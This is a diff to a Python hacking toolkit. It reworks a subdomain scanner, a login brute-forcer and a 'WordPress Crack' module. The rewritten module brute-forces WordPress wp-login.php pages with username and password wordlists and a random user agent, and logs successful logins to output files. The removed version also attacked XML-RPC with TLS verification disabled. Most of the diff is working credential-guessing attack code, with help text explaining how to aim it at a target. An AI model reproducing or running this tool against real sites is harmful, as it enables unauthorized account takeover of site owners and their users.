@@ -325,7 +325,7 @@ os.system(clrcmd)
 banner = f"""\033[38;5;208m
      │_________________________
  │   │''|''|''|''|''|''|''|''| \__
- ┝━━━┥    \033[1;208;41m[WEBSITE SCANNER]\033[0;38;5;208m     __]━───────────
+ ┝━━━┥    \033[1;30;41m[WEBSITE SCANNER]\033[0;38;5;208m     __]━───────────
  │   │_________________________/
      │                      \033[1;31mBy: {author} {version}
      {W}
@@ -776,8 +776,8 @@ class SUB():
       try:
         subdomains = []
         with open("./src/subdomains.txt", 'r') as file:
-          try:
-            for line in file:
+          for line in file:
+            try:
               word = line.strip()
               test_url = word + "." + s_url
               response = self.request(test_url)
@@ -796,20 +796,26 @@ class SUB():
                 temp.writelines(text)
                 temp.close()
 
-          except KeyboardInterrupt:
-            if os.path.exists("./.temp/" + filetemp):
-              removeDups(filetemp)
-              c = open("./.temp/" + filetemp, "r")
-              name = "./output/subscan/" + n_url + ".txt"
-              content = c.read()
-              c.close()
-              os.remove("./.temp/" + filetemp)
-              save_file(name, content, 1)
-            else:
-              input(f"\n{fail}{BO} Nothing is Saved!")
-              main()
-            main()
+            except KeyboardInterrupt:
+              pause = str(
+              input(
+                f"\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
+              ))
 
+              if pause == "X" or pause == "x":
+                if os.path.exists("./.temp/" + filetemp):
+                  removeDups(filetemp)
+                  c = open("./.temp/" + filetemp, "r")
+                  name = "./output/subscan/" + n_url + ".txt"
+                  content = c.read()
+                  c.close()
+                  os.remove("./.temp/" + filetemp)
+                  save_file(name, content, 1)
+                else:
+                  input(f"\n{fail}{BO} Nothing is Saved!")
+                main()
+                break
+                
           if os.path.exists("./.temp/" + filetemp):
             removeDups(filetemp)
             c = open("./.temp/" + filetemp, "r")
@@ -1626,13 +1632,14 @@ class LOG():
         else:
           passwd = passwd
 
-      user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
-
+      
       if _csrf == 1:
+        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
         password_field = str(input(f"{W} ├─[{BO}Pass Field{W}]{BB} "))
         csrf_field = str(input(f"{W} └─[{BO}CSRF Token{W}]{BG} "))
         csrf = 1
       else:
+        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
         password_field = str(input(f"{W} └─[{BO}Pass Field{W}]{BB} "))
         csrf_field = str("None")
 
@@ -2027,152 +2034,64 @@ class LOG():
       main()
 
 
-#MARKER #WordPress Crack =====================================
+#WordPress Crack =====================================
 class WP():
 
-  def userAgentS(self):
-    listAgent = open("./src/UserAgent.txt", "r")
-    Agent = listAgent.read().splitlines()
-    Ua = random.choice(Agent)
-    return Ua
-
-  def urlCMS(self, url, brutemode):
-    if url[:8] != "https://" and url[:7] != "http://":
-      print(f"\n{error}{BR} You must insert http:// or https:// procotol")
-      self.main()
-    # Page login
-    if "https" in url:
-      url = url.replace("https", "http")
-
-    if brutemode == "std":
-      if "/wp-login.php" in url:
-        url = url
-      else:
-        url = url + '/wp-login.php'
-    else:
-      if "/xmlrpc.php" in url:
-        url = url
-      else:
-        url = url + '/xmlrpc.php'
-    return url
-
-  def bodyCMS(self, username, pwd, brutemode):
-    if brutemode == "std":
-      body = {
-        'log': username,
-        'pwd': pwd,
-        'wp-submit': 'Login',
-        'testcookie': '1'
-      }
-    else:
-      body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
-         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (
-        username, pwd)
-    return body
-
-  def headersCMS(self, Ua, lenbody, brutemode):
-    if brutemode == "std":
-      headers = {
-        'User-Agent': Ua,
-        'Content-type': 'application/x-www-form-urlencoded',
-        'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
-      }
-    else:
-      headers = {
-        'User-Agent': Ua,
-        'Content-type': 'text/xml',
-        'Content-Length': "%d" % len(lenbody)
-      }
-    return headers
-
-  def responseCMS(self, response):
-    if 'set-cookie' in response:
-      if response['set-cookie'].split(" ")[-1] == "httponly":
-        return "1"
-    else:
-      pass
-
-  def connection(self, url, user, password, Ua, timeout, brutemode):
-
-    username = user
-    pwd = password
-    n_url = urlparse(url).hostname
-    http = httplib2.Http(timeout=timeout,
-                         disable_ssl_certificate_validation=True)
-
-    # HTTP POST Data
-    body = self.bodyCMS(username, pwd, brutemode)
-
-    # Headers
-    headers = self.headersCMS(Ua, body, brutemode)
-
+  def main(self):
     try:
 
-      if brutemode == "std":
-        response, content = http.request(url,
-                                         'POST',
-                                         headers=headers,
-                                         body=urllib.parse.urlencode(body))
+      bfmode = 0
+      usrmode = 0
+      passmode = 0
+      os.system(clrcmd)
+      print(banner)
+      print(f"{W}[{BR}@{W}]{BG} WordPress Crack{W}")
+      _input = input(f" ├─[{BO}Target{W}]{P} ")
 
-        if str(response.status)[0] == "4" or str(response.status)[0] == "5":
-          input(error + BR + ' HTTP error, code: ' + str(response.status))
-          self.main()
+      if _input.isspace():
+        input(invalid)
+        self.main()
 
-        if self.responseCMS(response) == "1":
+      elif not "/wp-login.php" in _input:
+        _input = _input + "/wp-login.php"
 
-          print(
-            f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}"
-          )
-          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
-            url, user, password)
-          name = "./output/wpbrute/" + n_url + ".txt"
-          save_file(name, text, 1)
-          main()
+      elif "https" in _input:
+        _input.replace("https", "http")
 
-        checkCon = "OK"
-        return checkCon
+      user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
+
+      if os.path.isfile(user) and os.access(user, os.R_OK):
+        user = user
+        bfmode = 1
+        usrmode = 1
       else:
-        response, content = http.request(url,
-                                         'POST',
-                                         headers=headers,
-                                         body=body)
+        user = user
 
-        if str(response.status)[0] == "4" or str(response.status)[0] == "5":
-          input(error + BR + ' HTTP error, code: ' + str(response.status))
-          self.main()
+      passwd = str(input(f"{W} └─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
 
-        # Remove all blank and newline chars
-        xmlcontent = content.decode().replace(" ", "").replace("\n", "")
+      if passwd == "" or passwd == " ":
+        passwd = "./src/passwords.txt"
+        bfmode = 2
+        passmode = 1
+      else:
+        if os.path.isfile(passwd) and os.access(passwd, os.R_OK):
+          passwd = passwd
+          bfmode = 2
+          passmode = 1
+        else:
+          passwd = passwd
 
-        if not "faultCode" in xmlcontent:
-          print(
-            f"\n{found}{BG} Login User Found!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}"
-          )
-          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
-            url, user, password)
-          name = "./output/wpbrute/" + n_url + ".txt"
-          save_file(name, text, 1)
-          main()
+      if usrmode == 1 and passmode == 1:
+        bfmode = 3
 
-        checkCon = "OK"
-        return checkCon
+      target = _input
+      user_field = str("log")
+      password_field = str("pwd")
+
+      self.run(target, user, passwd, user_field, password_field, bfmode)
+
     except KeyboardInterrupt:
       cancel()
-    except socket.timeout:
-      input(f"{error}{BR} Connection Timeout")
-      main()
-    except socket.error:
-      input(f"{error}{BR} Connection Refused")
-      main()
-    except httplib.ResponseNotReady:
-      input(f"{error}{BR} Server Not Responding")
-      main()
-    except httplib2.ServerNotFoundError:
-      input(f"{error}{BR} Server Not Found")
-      main()
-    except httplib2.HttpLib2Error:
-      input(f"{error}{BR} Connection Error!!")
-      main()
 
   def blocks(self, files, size=65536):
     while True:
@@ -2180,126 +2099,330 @@ class WP():
       if not b: break
       yield b
 
-  def main(self):
-    try:
-      opt = 0
-      os.system(clrcmd)
-      print(banner)
-      print(f"{W}[{BR}@{W}]{BG} WordPress Crack {W}")
-      print(f" ├─[{PINK}Mode -1 = standard, -2 = xml-rpc{W}]")
-      print(f"{W} │")
-      _input = input(f" └─[{BO}Target{W}]{P} ")
-      _input = _input.replace(" ", "")
+  def run(self, url, user, passwd, user_field, password_field, bfmode):
+    n_url = urlparse(url).hostname
+    totaluser = 1
+    totalwordlist = 1
+    filetemp = str(uuid.uuid4())
 
-      if "-1" in _input:
-        _input = _input.replace("-1", "")
-        opt = 1
-        mode = "Standard"
-        url = _input
-        self.run(opt, mode, url)
-
-      elif "-2" in _input:
-        _input = _input.replace("-2", "")
-        mode = "Xml-Rpc"
-        url = _input
-        self.run(opt, mode, url)
-
+    if bfmode == 1:
+      user_size = os.path.getsize(user) >> 20
+      if user_size < 100:
+        with open(user) as f:
+          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-        input(invalid)
-        self.main()
+        totaluser = "unknown"
 
-    except KeyboardInterrupt:
-      cancel()
-
-  def run(self, opt, mode, url):
-    try:
-      os.system(clrcmd)
-      print(banner)
-      print(f"{W}[{BR}@{W}]{BG} WordPress Crack {W}")
-      print(f"{W} ├─[{BO}Brute Mode{W}] {P}{mode}")
-      print(f"{W} ├─[{BO}Target Url{W}] {P}{url}")
-      user = str(input(f"{W} ├─[{BO}Username{W}]{P} "))
-      wlfile = str(
-        input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{P} "))
-      if wlfile == "" or wlfile == " ":
-        wlfile = "./src/passwords.txt"
-      else:
-        if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
-          input(f"{error}{BR} File Does Not Exists!")
-          self.main()
-        else:
-          wlfile = wlfile
-
-      timeout = input(f"{W} └─[{BO}Response Timeout{W}]{P} ")
-      if timeout.isspace() or "" in timeout:
-        timeout = 3
-        timeout = int(timeout)
-      else:
-        timeout = int(timeout)
-
-      if opt == 1:
-        brtmd = "std"
-      else:
-        brtmd = "xml"
-
-      # Gen Random UserAgent
-      Ua = self.userAgentS()
-      # Url to url+login_cms_page
-      url = self.urlCMS(url, brtmd)
-
-      wlsize = os.path.getsize(wlfile) >> 20
-      if wlsize < 100:
-        with open(wlfile) as f:
+    elif bfmode == 2:
+      passwd_size = os.path.getsize(passwd) >> 20
+      if passwd_size < 100:
+        with open(passwd) as f:
           totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
       else:
         totalwordlist = "unknown"
 
-      print(f"\n{success}{BB} Target.....: {url}")
-      print(
-        f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)} [{wlfile}]")
-      print(f"{success}{BB} Username...: {user}")
-      print(f"{success}{BB} BruteMode..: {mode}")
-      print(f"{success}{BB} Connecting.......")
+    elif bfmode == 3:
+      user_size = os.path.getsize(user) >> 20
+      if user_size < 100:
+        with open(user) as f:
+          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+        totaluser = "unknown"
 
-      if self.connection(url, user, Ua, Ua, timeout, brtmd) == "OK":
-        print(f"\n{success}{BB} Connection Established!")
+      passwd_size = os.path.getsize(passwd) >> 20
+      if passwd_size < 100:
+        with open(passwd) as f:
+          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
+      else:
+        totalwordlist = "unknown"
 
-      count = 0
-      totalwordlist = str(totalwordlist)
-      term = Terminal()
-      #threads = []
+    print(f"\n{success}{BB} Target.......: {P}{url}")
+    print(
+      f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
+    print(
+      f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]"
+    )
 
-      with open(wlfile) as wordlist:
-        for pwd in wordlist:
-          if self.connection(url, user, Ua, Ua, timeout, brtmd) == "OK":
+    checkConnection(url, 1)
+
+    listAgent = open("./src/UserAgent.txt", "r")
+    Agent = listAgent.read().splitlines()
+    Ua = random.choice(Agent)
+    header = {'User-Agent': Ua}
+
+    count = 1
+    count1 = 1
+    count2 = 1
+    usrcnt = 0
+    no = usrcnt + 1
+    totalwordlist = str(totalwordlist)
+    totaluser = str(totaluser)
+    term = Terminal()
+    print("\n")
+
+    if bfmode == 1:
+      with open(user) as usrlist:
+        try:
+          for usr in usrlist:
+            cnt = W + "[" + BO + str(count) + '/' + totaluser + W + "]"
+
+            payload = {
+                user_field: usr.replace('\n', ''),
+                password_field: passwd
+            }
+
+            progress = BO + " User: " + P + usr.replace(
+              '\n', '') + BO + " Pass: " + P + passwd
+            save = str(no) + " | " + url + " | " + usr.replace(
+              '\n', '') + " | " + passwd
+
+            req = requests.post(url, data=payload, headers=header)
+
+            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+              usrcnt += 1
+              no += 1
+              text = f"{save}\n"
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
+              with term.location(x=0, y=21):
+                print(whitespace)
+              with term.location(x=0, y=21):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+              break
+
+            else:
+              with term.location(x=0, y=21):
+                print(whitespace)
+              with term.location(x=0, y=21):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+
+            sleep(0.010)
             count += 1
-            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"
-            self.connection(url, user, pwd, Ua, timeout, brtmd)
-            #t = Thread(target=self.connection, args=(url,user,pwd,Ua,timeout,brtmd))
-            #t.start()
-            #threads.append(t)
 
-            with term.location(x=0, y=28):
-              try:
-                with term.location(x=0, y=29):
-                  print(whitespace)
-                with term.location(x=0, y=29):
-                  print(f"{cnt}{BO} User: {P}{user}{BO} Pass: {P}{pwd}")
-              except KeyboardInterrupt:
-                with term.location(x=0, y=30):
-                  cancel()
+        except KeyboardInterrupt:
+          pause = str(
+            input(
+              f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
+            ))
 
-            sleep(0.150)
-            count = int(count)
+          if pause == "X" or pause == "x":
+            if os.path.exists("./.temp/" + filetemp):
+              c = open("./.temp/" + filetemp, "r")
+              name = "./output/wpbrute/" + n_url + ".txt"
+              content = c.read()
+              c.close()
+              os.remove("./.temp/" + filetemp)
+              save_file(name, content, 1)
+              main()
+
+            else:
+              if usrcnt > 0:
+                content = f"{save}\n"
+                name = "./output/wpbrute/" + n_url + ".txt"
+                save_file(name, content, 1)
+                main()
+              else:
+                input(f"\n{fail}{BO} Nothing is Saved!")
+                main()
+
           else:
-            input(f"\n{error}{BR} Check Your Internet Connection!")
+            text = f"{save}\n"
+            temp = open("./.temp/" + filetemp, "a+")
+            temp.writelines(text)
+            temp.close()
 
-      #for a in threads:
-      # a.join()
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/wpbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
 
-      print(f"\n{error}{BR} Password NOT found :(")
-    except KeyboardInterrupt:
-      cancel()
+      input(f"\n{error}{BR} Username Not Found!")
+      main()
+
+    elif bfmode == 2:
+      with open(passwd) as wordlist:
+        try:
+          for pwd in wordlist:
+            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"
+
+            payload = {
+                user_field: user,
+                password_field: pwd.replace('\n', '')
+            }
+
+            progress = BO + " User: " + P + user + BO + " Pass: " + P + pwd.replace(
+              '\n', '')
+            save = str(no) + " | " + url + " | " + user + " | " + pwd.replace(
+              '\n', '')
+
+            req = requests.post(url, data=payload, headers=header)
+
+            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+              usrcnt += 1
+              no += 1
+              text = f"{save}\n"
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
+              with term.location(x=0, y=21):
+                print(whitespace)
+              with term.location(x=0, y=21):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+              break
+
+            else:
+              with term.location(x=0, y=21):
+                print(whitespace)
+              with term.location(x=0, y=21):
+                print(f"{success}{BB} Payload: {W}{payload}")
+              print(f"{whitespace}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+
+            sleep(0.010)
+            count += 1
+
+        except KeyboardInterrupt:
+          cancel()
+
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/wpbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
+
+      input(f"\n{error}{BR} Password Not Found!")
+      main()
+
+    elif bfmode == 3:
+      with open(user) as usrlist:
+        for usr in usrlist:
+          count2 = 0
+          with open(passwd) as wordlist:
+            try:
+              for pwd in wordlist:
+                cnt = W + "[" + BO + str(
+                  count1) + '/' + totaluser + W + "][" + BO + str(
+                    count2) + '/' + totalwordlist + W + "]"
+
+                payload = {
+                    user_field: usr.replace('\n', ''),
+                    password_field: pwd.replace('\n', '')
+                }
+
+                progress = BO + " User: " + P + usr.replace(
+                  '\n', '') + BO + " Pass: " + P + pwd.replace('\n', '')
+                save = str(no) + " | " + url + " | " + usr.replace(
+                  '\n', '') + " | " + pwd.replace('\n', '')
+
+                req = requests.post(url, data=payload, headers=header)
+
+                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+                  usrcnt += 1
+                  no += 1
+                  text = f"{save}\n"
+                  temp = open("./.temp/" + filetemp, "a+")
+                  temp.writelines(text)
+                  temp.close()
+                  break
+
+                else:
+                  with term.location(x=0, y=21):
+                    print(whitespace)
+                  with term.location(x=0, y=21):
+                    print(f"{success}{BB} Payload: {W}{payload}")
+                  print(f"{whitespace}", end='\r')
+                  print(
+                    f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
+
+                sleep(0.010)
+                count2 += 1
+
+            except KeyboardInterrupt:
+              pause = str(
+                input(
+                  f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
+                ))
+
+              if pause == "X" or pause == "x":
+                if os.path.exists("./.temp/" + filetemp):
+                  c = open("./.temp/" + filetemp, "r")
+                  name = "./output/wpbrute/" + n_url + ".txt"
+                  content = c.read()
+                  c.close()
+                  os.remove("./.temp/" + filetemp)
+                  save_file(name, content, 1)
+                  main()
+
+                else:
+                  if usrcnt > 0:
+                    content = f"{save}\n"
+                    name = "./output/wpbrute/" + n_url + ".txt"
+                    save_file(name, content, 1)
+                    main()
+                  else:
+                    input(f"\n{fail}{BO} Nothing is Saved!")
+                    main()
+
+              else:
+                text = f"{save}\n"
+                temp = open("./.temp/" + filetemp, "a+")
+                temp.writelines(text)
+                temp.close()
+          count1 += 1
+
+      if os.path.exists("./.temp/" + filetemp):
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/wpbrute/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+        main()
+
+      input(f"\n{error}{BR} Username & Password Not Found!")
+      main()
+
+    else:
+      payload = {user_field: user, password_field: passwd}
+
+      req = requests.post(url, data=payload, headers=header)
+      if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+        print(
+          f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}"
+        )
+
+        content = f"{url} | {user} | {passwd}\n"
+        name = "./output/wpbrute/" + n_url + ".txt"
+        save_file(name, content, 1)
+        main()
+
+      else:
+        with term.location(x=0, y=21):
+          print(whitespace)
+        with term.location(x=0, y=21):
+          print(f"{success}{BB}Payload: {W}{payload}")
+        print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
+      input(f"\n{error}{BR} Login Incorrect!")
+      main()
 
 
 #NSLookup =====================================
@@ -2788,14 +2911,14 @@ def helps():
       {B}To enable CSRF mode, add the option {P}-csrf {B}to the input.
       
       {WH}Example: (Without CSRF Token)
-      ~> http://site.com/login/
+      target > http://site.com/login/userlogin.php
       username > admin
       wordlist > src/passwords.txt
       user field > uname
       pass field > upass
 
       {WH}Example: (With CSRF Token)
-      ~> http://site.com/login/ -csrf
+      target > http://site.com/login/ -csrf
       username > admin
       wordlist > src/passwords.txt
       user field > uname
@@ -2803,26 +2926,15 @@ def helps():
       csrf token > csrf
 
 {success}{PINK} WordPress Crack:
-    {W}This tool is for brute-forcing WordPress login pages and XML-RPC in WordPress.
-    You have the option to select a password wordlist or use the default one [src/passwords.txt].
-    You can also set the response timeout, which is set to 3 seconds by default.
+    {W}This tool is for brute-forcing WordPress login pages.
+    You have the option to select a username/password wordlist or use the default one [src/passwords.txt].
 
   {printout}{BO} Usage:
-      {B}This tool requires a mode to be selected.
-      To choose standard mode, enter {P}-1.{W}
-      To choose XML-RPC mode, enter {P}-2.{W}
-      
-      {WH}Example: (Standard Mode)
-      ~> http://wordpress.com/wp-login.php -1
-      username > admin
-      wordlist > src/passwords.txt
-      timeout > 5
 
-      {WH}Example: (Xml-Rpc Mode)
-      ~> http://wordpress.com/xmlrpc.php -2
-      username > admin
-      wordlist > src/passwords.txt
-      timeout > 5
+      {WH}Example: 
+      target > http://localhost.wordpress/wp-login.php
+      username > admin or path/to/file/list.txt
+      wordlist > password or path/to/file/list.txt (leave blank for default password in ./src/passwords.txt)
 
 
 {systm}{W}───────────{BG}[Network Tools]{W}────────────{systm}
